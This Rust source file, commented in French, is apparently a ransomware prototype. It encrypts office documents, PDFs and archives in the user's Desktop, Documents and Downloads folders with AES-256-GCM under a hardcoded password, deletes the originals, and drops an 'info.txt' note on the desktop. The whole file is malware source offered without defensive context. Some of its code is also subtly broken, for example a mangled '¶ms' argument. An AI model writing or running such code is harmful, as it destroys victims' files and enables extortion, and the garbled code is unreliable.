use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;

use aes_gcm::{Aes256Gcm, Key, Nonce};
use rand::RngCore;
use scrypt::{scrypt, ScryptParams};

const SALT_LEN: usize = 16;
const NONCE_LEN: usize = 12;
const TAG_LEN: usize = 16;

fn derive_key(password: &[u8], salt: &[u8]) -> Key {
    let params = ScryptParams::recommended();
    let mut key = [0u8; 32];
    scrypt(password, salt, ¶ms, &mut key).unwrap();
    Key::from_slice(&key)
}

fn encrypt_file(password: &[u8], in_filename: &Path, out_filename: &Path) -> Result<(), Box<dyn std::error::Error>> {
    // Générer un sel aléatoire
    let mut salt = [0u8; SALT_LEN];
    rand::thread_rng().fill_bytes(&mut salt);

    // Dériver la clé de chiffrement
    let key = derive_key(password, &salt);

    // Générer un nonce aléatoire
    let mut nonce_bytes = [0u8; NONCE_LEN];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    // Ouvrir le fichier à chiffrer
    let mut infile = File::open(in_filename)?;
    let mut buffer = Vec::new();
    infile.read_to_end(&mut buffer)?;

    // Chiffrer les données
    let cipher = Aes256Gcm::new(&key);
    let ciphertext = cipher.encrypt(&nonce, buffer.as_slice()).unwrap();

    // Écrire le sel, le nonce et le texte chiffré dans le fichier de sortie
    let mut outfile = File::create(out_filename)?;
    outfile.write_all(&salt)?;
    outfile.write_all(&nonce_bytes)?;
    outfile.write_all(&ciphertext)?;

    // Supprimer le fichier original
    fs::remove_file(in_filename)?;

    Ok(())
}

fn encrypt_matching_files(password: &[u8], folder_path: &Path, extensions: &[&str]) -> Result<(), Box<dyn std::error::Error>> {
    for entry in fs::read_dir(folder_path)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_file() {
            if let Some(extension) = path.extension().and_then(|s| s.to_str()) {
                if extensions.contains(&extension) {
                    let out_path = path.with_extension("enc");
                    encrypt_file(password, &path, &out_path)?;
                    println!("Fichier chiffré : {}", path.display());
                }
            }
        }
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let user_home = dirs::home_dir().unwrap();
    let folders_to_encrypt = [
        user_home.join("Desktop"),
        user_home.join("Documents"),
        user_home.join("Downloads"),
    ];
    let password = b"VotreMotDePasseFort";
    let extensions = [
        "docx", "xlsx", "csv", "pdf", "zip", "rar"
    ];

    for folder_path in &folders_to_encrypt {
        encrypt_matching_files(password, folder_path, &extensions)?;
        println!("Fichiers chiffrés dans '{}' avec succès.", folder_path.display());
    }

    // Créer le fichier info.txt sur le bureau
    let desktop_path = dirs::desktop_dir().unwrap();
    let info_file_path = desktop_path.join("info.txt");
    let mut info_file = File::create(info_file_path)?;
    info_file.write_all(b"bonjour")?;

    Ok(())
}
